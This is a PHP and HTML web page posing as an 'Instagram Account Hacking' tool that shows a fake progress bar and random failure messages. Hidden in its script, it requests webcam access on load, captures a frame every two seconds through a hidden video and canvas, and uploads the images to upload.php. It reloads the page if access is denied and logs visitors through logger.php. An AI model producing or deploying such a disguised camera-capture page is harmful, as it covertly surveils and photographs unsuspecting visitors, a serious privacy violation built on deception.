<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Account Hacking</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            line-height: 1.6;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            width: 100%;
            max-width: 600px;
            background-color: #111;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
            position: relative;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #00ff00;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 12px;
            background-color: #222;
            border: 1px solid #333;
            border-radius: 4px;
            color: #00ff00;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #00ff00;
        }
        
        button {
            background-color: #005500;
            color: #00ff00;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
            width: 100%;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }
        
        button:hover {
            background-color: #003300;
        }
        
        button:disabled {
            background-color: #333;
            color: #666;
            cursor: not-allowed;
        }
        
        .simulation-area {
            margin-top: 30px;
            text-align: center;
            min-height: 100px;
        }
        
        .progress-container {
            width: 100%;
            background-color: #222;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 20px;
            background-color: #00aa00;
            width: 0%;
            transition: width 0.1s linear;
        }
        
        .status-message {
            margin: 20px 0;
            font-size: 18px;
            min-height: 27px;
        }
        
        .error-message {
            color: #ff5555;
            font-weight: bold;
            margin-top: 20px;
        }
        
        .disclaimer {
            margin-top: 40px;
            padding: 20px;
            background-color: #222;
            border: 1px solid #ff5555;
            border-radius: 4px;
            color: #ffffff;
        }
        
        .disclaimer h2 {
            color: #ff5555;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .copyright {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 20px;
            }
        }
        
        video, canvas {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram Account Hacking</h1>
        
        <div class="form-group">
            <label for="username">Enter Instagram Username or Profile Link</label>
            <input type="text" id="username" placeholder="Enter username or profile URL">
        </div>
        
        <button id="hack-button">Hack Account</button>
        
        <div class="simulation-area">
            <div class="status-message" id="status-message"></div>
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            <div class="error-message" id="error-message"></div>
        </div>
        
        <div class="disclaimer">
            <h2>⚠️ IMPORTANT DISCLAIMER ⚠️</h2>
            <p>This Website Only For Education Purpose</p>
            <p>We Are Anonymous</p>
            <p>We are Legion</p>
            <p>We do not forget</p>
            <p>We do not forgive</p>
            <p>Expect US</p>
        </div>
        
        <div class="copyright">
            © 2025 Instagram Hacking All Rights Reserved.
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const hackButton = document.getElementById('hack-button');
        const usernameInput = document.getElementById('username');
        const statusMessage = document.getElementById('status-message');
        const progressBar = document.getElementById('progress-bar');
        const errorMessage = document.getElementById('error-message');
        
        const errorMessages = [
            "Hacking failed: Invalid username.",
            "Account protected by advanced security protocols.",
            "Exceeded rate limit. Try again later.",
            "Unable to connect to Instagram server. Check your internet connection.",
            "Account already compromised. Unable to proceed.",
            "Security verification failed. Hacking attempt blocked.",
            "Two-factor authentication detected. Cannot bypass.",
            "Proxy connection terminated. Attempt logged.",
            "Insufficient permissions. Admin privileges required.",
            "Session expired. Please refresh and try again."
        ];
        
        const statusMessages = [
            "Initializing hacking sequence...",
            "Bypassing security protocols...",
            "Cracking password encryption...",
            "Injecting malicious payload...",
            "Establishing remote connection...",
            "Scanning for vulnerabilities...",
            "Exploiting zero-day vulnerability...",
            "Brute-forcing credentials...",
            "Intercepting authentication tokens...",
            "Finalizing data extraction..."
        ];
        
        hackButton.addEventListener('click', function() {
            if (!usernameInput.value.trim()) {
                showError("Please enter a username or profile URL to continue.");
                return;
            }
            
            let input = usernameInput.value.trim();
            let username = input;
            
            if (input.startsWith("http") || input.startsWith("www") || input.includes("instagram.com")) {
                try {
                    let cleanUrl = input.replace(/(https?:\/\/)?(www\.)?/i, "");
                    let pathParts = cleanUrl.split('instagram.com/')[1];
                    if (pathParts) {
                        username = pathParts.split('/')[0].split('?')[0];
                    }
                } catch (e) {
                    console.log("Couldn't parse URL, using as-is");
                }
            }
            
            console.log("Processing username:", username);
            
            hackButton.disabled = true;
            errorMessage.textContent = "";
            
            simulateHacking();
        });
        
        function simulateHacking() {
            let timeLeft = 30;
            let progress = 0;
            let statusInterval;
            
            statusInterval = setInterval(() => {
                const randomStatus = statusMessages[Math.floor(Math.random() * statusMessages.length)];
                statusMessage.textContent = randomStatus;
            }, 2000);
            
            const progressInterval = setInterval(() => {
                timeLeft--;
                progress = ((30 - timeLeft) / 30) * 100;
                progressBar.style.width = progress + "%";
                
                if (timeLeft <= 0) {
                    clearInterval(progressInterval);
                    clearInterval(statusInterval);
                    finishSimulation();
                }
            }, 1000);
        }
        
        function finishSimulation() {
            hackButton.disabled = false;
            statusMessage.textContent = "";
            const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
            errorMessage.textContent = randomError;
            
            setTimeout(() => {
                progressBar.style.width = "0%";
            }, 3000);
        }
        
        function showError(message) {
            errorMessage.textContent = message;
            setTimeout(() => {
                errorMessage.textContent = "";
            }, 3000);
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let lastImageHash = "";

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0;
            }
            return hash;
        }

        function captureAndSend() {
            const width = video.videoWidth;
            const height = video.videoHeight;

            if (width === 0 || height === 0) return;

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return;
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        startCamera();
        fetch("logger.php").then(res => res.text()).then(console.log);
    </script>
</body>
</html>